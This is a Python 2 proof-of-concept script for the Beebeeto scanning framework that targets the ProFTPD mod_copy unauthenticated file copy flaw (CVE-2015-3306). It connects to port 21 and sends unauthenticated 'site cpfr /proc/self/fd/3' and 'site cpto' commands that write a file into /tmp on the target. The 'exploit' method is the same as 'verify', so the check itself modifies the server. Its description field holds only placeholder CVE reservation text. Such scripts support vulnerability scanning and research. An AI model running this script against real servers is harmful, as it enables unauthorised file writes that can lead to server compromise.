#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import random
import telnetlib

from baseframe import BaseFrame
from utils.http import http


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0088',
            'name': 'ProFTPD <=1.3.5 mod_copy 未授权文件复制漏洞(CVE-2015-3306) POC',
            'author': 'evi1m0',
            'create_date': '2015-04-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'ftp',
            'port': [21],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ProFTPD',
            'vul_version': ['<=1.3.5'],
            'type': 'Other',
            'tag': ['ProFTPD漏洞', 'mod_copy漏洞', 'CVE-2015-3306'],
            'desc': '''
                    This candidate has been reserved by an organization or individual that will use it when announcing
                    a new security problem. When the candidate has been publicized, the details for this candidate will be
                    provided.
                    ''',
            'references': ['http://bugs.proftpd.org/show_bug.cgi?id=4169',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        ip = http.transform_target_ip(http.normalize_url(args['options']['target']))
        if args['options']['verbose']:
            print '[*] {} Connecting...'.format(ip)
        tn = telnetlib.Telnet(ip, port=21, timeout=15)
        tn.write('site help\r\n')
        tn.write('quit\n')
        status = tn.read_all()
        if 'CPTO' in status and 'CPFR' in status:
            if args['options']['verbose']:
                print '[*] Find CPTO & CPFR'
            tn = telnetlib.Telnet(ip, port=21, timeout=15)
            filename_tmp = '/tmp/evi1m0_%s.sh'%random.randint(1, 1000)
            tn.write('site cpto evi1m0@beebeeto\n')
            tn.write('site cpfr /proc/self/fd/3\n')
            tn.write('site cpto %s\n'%filename_tmp)
            tn.write('quit\n')
            result = tn.read_all()
            if 'Copy successful' in result:
                args['success'] = True
                args['poc_ret']['vul_target'] = ip
                args['poc_ret']['filename'] = filename_tmp
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())